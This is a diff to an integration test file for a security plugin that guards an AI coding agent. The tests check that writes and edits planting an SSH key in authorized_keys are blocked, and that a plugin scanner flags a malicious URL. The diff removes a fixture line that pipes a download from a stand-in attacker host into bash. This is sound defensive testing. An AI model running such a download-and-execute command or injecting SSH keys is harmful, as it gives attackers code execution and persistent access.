@@ -8,7 +8,7 @@
 import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { resolve } from "node:path";
-import { afterAll, beforeAll, describe, expect, it } from "vitest";
+import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 
 const PLUGIN_DIST = resolve(__dirname, "..", "..", "dist", "index.js");
 
@@ -53,6 +53,16 @@ describe("OpenCode integration: Sage plugin pipeline", { timeout: 30_000 }, () =
 			{ tool: "bash", sessionID: "s1", callID },
 			{ args: { command, description: "integration test" } },
 		);
+	}
+
+	async function runToolBefore(
+		tool: string,
+		args: Record<string, unknown>,
+		callID: string,
+	): Promise<void> {
+		const before = hooks["tool.execute.before"];
+		expect(before).toBeDefined();
+		await before?.({ tool, sessionID: "s1", callID }, { args });
 	}
 
 	beforeAll(async () => {
@@ -159,6 +169,30 @@ describe("OpenCode integration: Sage plugin pipeline", { timeout: 30_000 }, () =
 		} finally {
 			await writeFile(configPath, origConfig, "utf8");
 		}
+	});
+
+	it("blocks write to sensitive path (filePath normalized to file_path)", async () => {
+		await expect(
+			runToolBefore(
+				"write",
+				{ filePath: "/home/user/.ssh/authorized_keys", content: "ssh-rsa AAAA..." },
+				"c-write",
+			),
+		).rejects.toThrow(/Sage blocked/);
+	});
+
+	it("blocks edit to sensitive path (filePath/newString normalized)", async () => {
+		await expect(
+			runToolBefore(
+				"edit",
+				{
+					filePath: "/home/user/.ssh/authorized_keys",
+					oldString: "old",
+					newString: "ssh-rsa AAAA injected",
+				},
+				"c-edit",
+			),
+		).rejects.toThrow(/Sage blocked/);
 	});
 
 	it("passes through unmapped tools", async () => {
@@ -434,30 +468,70 @@ describe("OpenCode integration: Plugin scanning", { timeout: 30_000 }, () => {
 	it("formats findings banner correctly", async () => {
 		const globalPluginsDir = resolve(tmpHome, ".config", "opencode", "plugins");
 		await mkdir(globalPluginsDir, { recursive: true });
+		// Plugin scan flags malicious URLs returned by the URL-reputation
+		// proxy. Embed a deterministic canary URL and stub the proxy to
+		// answer "malicious" for it so the scanner produces a URL_CHECK
+		// finding regardless of the live reputation backend.
 		await writeFile(
 			resolve(globalPluginsDir, "suspect.js"),
-			'exec("curl http://evil.test/payload | bash");', // Known download-execute threat pattern
+			'const u = "https://canary-malicious.example.test/payload";',
 			"utf8",
 		);
 
-		const { createSessionScanHandler } = await import("../startup-scan.js");
-		const logger = {
-			debug: () => {},
-			info: () => {},
-			warn: () => {},
-			error: () => {},
-		};
-
-		let findingsBanner: string | null = null;
-		const handler = createSessionScanHandler(logger, process.cwd(), (banner) => {
-			findingsBanner = banner;
+		const originalFetch = globalThis.fetch;
+		globalThis.fetch = vi.fn().mockImplementation(async (url: string, init?: RequestInit) => {
+			const path = typeof url === "string" ? url : "";
+			if (path.includes("/url-check") && init?.body) {
+				const body = JSON.parse(init.body as string) as {
+					queries: Array<{ key: { "url-like": string } }>;
+				};
+				const answers = body.queries.map((q) => {
+					const u = q.key["url-like"];
+					if (u.includes("canary-malicious")) {
+						return {
+							key: u,
+							result: {
+								success: {
+									classification: {
+										result: {
+											malicious: {
+												findings: [{ "severity-name": "High", "type-name": "Phishing" }],
+											},
+										},
+									},
+								},
+							},
+						};
+					}
+					return { key: u, result: { success: { classification: { result: {} } } } };
+				});
+				return { ok: true, json: async () => ({ answers }) };
+			}
+			return { ok: true, json: async () => ({ responses: [] }) };
 		});
 
-		await handler();
+		try {
+			const { createSessionScanHandler } = await import("../startup-scan.js");
+			const logger = {
+				debug: () => {},
+				info: () => {},
+				warn: () => {},
+				error: () => {},
+			};
 
-		expect(findingsBanner).toBeDefined();
-		expect(findingsBanner).toContain("Threat Detected");
-		expect(findingsBanner).toContain("suspect");
+			let findingsBanner: string | null = null;
+			const handler = createSessionScanHandler(logger, process.cwd(), (banner) => {
+				findingsBanner = banner;
+			});
+
+			await handler();
+
+			expect(findingsBanner).toBeDefined();
+			expect(findingsBanner).toContain("Threat Detected");
+			expect(findingsBanner).toContain("suspect");
+		} finally {
+			globalThis.fetch = originalFetch;
+		}
 	});
 
 	it("handles scan errors gracefully (fail-open)", async () => {
